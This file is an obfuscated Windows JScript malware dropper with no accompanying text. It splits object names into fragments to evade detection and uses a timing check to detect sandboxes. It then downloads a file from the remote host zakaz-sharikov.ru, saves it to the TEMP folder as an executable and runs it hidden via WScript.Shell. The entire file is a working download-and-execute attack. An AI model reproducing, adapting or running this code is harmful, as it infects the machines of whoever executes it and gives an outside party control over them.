var C = false;
var VU = "Create"+"Object";
var G = function SM() {return WScript[VU]("WScript"+".Shell");}(), Z = 11;
var B = "MSXML2"+".XMLHTTP";
var AN = 2;
var X = AN - 2;
function M(ZF){G["Run"](ZF, X, X);};
function Y(){return B + "";};
function K(LX, I0){X = X * 1; return LX - I0;};
function MO(){return VU;};
/*@cc_on
  @if (@_win32 || @_win64)
    C = true;
  @end
@*/
if (C)
{
var D = "";
function UU(){return 22;};
var HJ = 0; var I = 0;
function R()
{
var MX = new this["Date"]();
var SZ = MX["getUTCMilliseconds"]();
WScript["Sleep"](UU());
var MX = new this["Date"]();
var OP = MX["getUTCMilliseconds"]();
WScript["Sleep"](UU());
var MX = new this["Date"]();
var ZX = MX["getUTCMilliseconds"]();
var HJ = "D0";
HJ = K(OP, SZ);
var I = "GQ";
I = K(ZX, OP);
D = "open";
return K(HJ, I);
}
var LO = false;
var TG = false;
for (var O = X; O < UU() * 1; O++){if (R() != X){
LO = true; 
I = "31" + 11 * HJ + I; 
TG = true; 
break;
}}
function VV() {return ((LO == true) && (LO == TG)) ? 1 : X;};
if (LO && VV() && TG){
function N() {return G["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "1SPHdpfKPYkE1ABe.ex" + "e";};
 R0 = Y();
 BA = WScript[VU](R0);
 var EA = 1;
do { 
	for (;EA;){
	try {
		if (EA == 1)
		{
			BA[D]("GET", "http://zakaz-sharikov.ru/x9dslp", false);
			BA["send"]();
			T = "Sleep";
			EA = 2;
		}
		WScript[T](UU() + 120); 
		if (BA["readystate"] < 2 * 2) continue;
		EA = X;
		function E(EE) {var N0 = (1, 2, 3, 4, 5, EE); return N0;};
		NS = WScript[MO()]("ADODB.Stream");
		R0 = NS;
		R0[D]();
		R0["type"] = E(1);
		R0["write"](BA["ResponseBody"]);
		NS["position"] = E(X);
		R0["Save" + "ToFile"](N(), 2);
		NS["cl"+"ose"]();
		P = N();
		M(P);
	} catch(B0){};};
}while (EA);
}
}

